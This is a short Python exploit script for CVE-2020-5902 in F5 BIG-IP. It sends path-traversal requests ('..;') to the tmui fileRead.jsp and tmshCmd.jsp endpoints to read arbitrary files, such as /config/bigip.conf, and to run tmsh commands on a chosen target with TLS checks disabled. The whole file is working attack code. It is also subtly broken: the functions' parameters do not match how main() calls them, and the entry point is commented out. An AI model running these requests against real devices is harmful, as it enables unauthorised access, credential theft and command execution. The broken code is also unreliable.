#!/usr/bin/env python3

import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser(description='F5 Big-IP CVE-2020-5902')
    parser.add_argument('-t', '--target', type=str, required=True,
                        help='Specify the target host')
    parser.add_argument('-x', '--exploit', type=str, required=True, default='lfr',
                        help='Specify the exploit; lfr or rce')
    parser.add_argument('-a', '--action', type=str, required=False, default='list+auth+user+admin',
                        help='Specify the rce action to execute')
    parser.add_argument('-f', '--filename', type=str, required=False, default='/config/bigip.conf',
                        help='Specify the filename to fetch via lfr')
    args = parser.parse_args()

    if args.exploit == 'lfr':
        lfr_req(args)
    elif args.exploit == 'rce':
        rce_req(args)
    else: parser.error('Please specify exploit; lfr or rce.')


def lfr_req(filename, target):
    print('[*] Attempting to fetch {0} from {1}'.format(filename, target))
    r = requests.get('https://{0}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName={1}'.format(target,filename), verify=False, timeout=5)
    if r.status_code == 200 and "root:" in r.text:
        return True
    else:
        return False


def rce_req(target, command):
    r = requests.get('https://{0}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command={1}'.format(target, command), verify=False, timeout=5)
    return True


# if __name__ == '__main__':
#     main()
